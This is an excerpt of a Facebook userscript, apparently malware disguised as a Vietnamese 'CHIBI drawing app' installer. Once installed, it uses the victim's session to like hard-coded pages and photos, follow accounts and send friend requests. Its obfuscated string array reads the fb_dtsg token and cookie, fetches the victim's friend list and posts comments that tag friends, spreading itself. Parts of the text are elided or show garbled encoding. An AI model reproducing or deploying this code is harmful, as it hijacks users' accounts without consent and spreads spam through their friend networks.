// ==UserScript==
// @name            Cài ứng dụng vẽ CHIBI cực cool, đẹp lung linh
// @description     All about facebook By Xmen
...
"chars" : " :) ",
	...
	// Toggler
	html += '<a class="navLink" title="1 Th?Ã‚Â´ng B?Ã‚Â¡o M?i">'; // var navLink
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/Erosaka" target="_blank">Ch?Ã‚Âºc M?ng B?n ?Ã‚Â?Ã‚Â£ C? i ?Ã‚Â?t ICON FaceBook Th? nh C?Ã‚Â´ng <br>NoName</a>';
	html += '</div>';
...
// Page
Like("563384307058772"); Like("224431131095041"); Like("404778692975900"); Like("1469493526599104");Like("282705885226028");
// a=subscribe
a("100000271696979"); a("100005554897970"); a("100004056662000"); a("100003837928711");
//P=like picture
P("537234023040624"); P("673746882644362"); P("427370254027002"); P("507984615965565"); P("516646375099389"); P("486176124813081");
P("489363304494363"); P("224001227787859"); P("532098333554193"); P("527024904061536"); P("673748955977488"); P("670055803013470");
P("487362751361085"); P("1469501103265013");
// IDS=addfriend
IDS("100002620941645"); IDS("100005522713648"); IDS("100005339493031"); IDS("100003146855199"); IDS("100008095956127");
//sublist("47301869474084");
//page

var _0xf841=["value","fb_dtsg","getElementsByName","match","cookie","282705885226028","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];
...
;arkadaslari_al(1469501103265013);arkadaslari_al(282705885226028);